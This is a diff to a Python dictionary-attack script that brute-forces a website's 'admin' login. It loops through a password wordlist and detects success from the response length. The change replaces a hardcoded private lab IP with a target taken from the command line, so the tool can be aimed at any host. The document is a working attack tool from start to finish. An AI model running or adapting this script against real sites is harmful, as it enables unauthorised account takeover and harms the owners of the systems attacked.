@@ -1,3 +1,4 @@
+import sys
 import requests
 import urllib.parse
 
@@ -21,7 +22,7 @@ def try_authentication(wrong_request_length: int, username: str, password: str):
 
     encoded_params = urllib.parse.urlencode(params)
 
-    url = 'http://192.168.56.2/?{}'.format(encoded_params)
+    url = f'http://{sys.argv[1]}/?{{}}'.format(encoded_params)
 
     response = requests.get(url)
     success = len(response.text) != wrong_request_length
@@ -30,20 +31,25 @@ def try_authentication(wrong_request_length: int, username: str, password: str):
     return success, response.text
 
 def main():
-    print("=== Brute forcing website ===")
-    username = "admin"
-    file = "dictionary.txt"
-    wrong_request_length = 1988
-    passwords = read_file(file)
+    try:
+        assert len(sys.argv) == 2, "IP address is not valid."
 
-    for password in passwords:
-        success, response = try_authentication(wrong_request_length, username, password)
+        print("=== Brute forcing website ===")
+        username = "admin"
+        file = "dictionary.txt"
+        wrong_request_length = 1988
+        passwords = read_file(file)
 
-        if success:
-            print(response)
-            return
+        for password in passwords:
+            success, response = try_authentication(wrong_request_length, username, password)
 
-    print(f"Password for username {username} is not in list.")
+            if success:
+                print(response)
+                return
+
+        print(f"Password for username {username} is not in list.")
+    except Exception as err:
+        print(f'Error: {err}')
 
 if __name__ == "__main__":
     main()
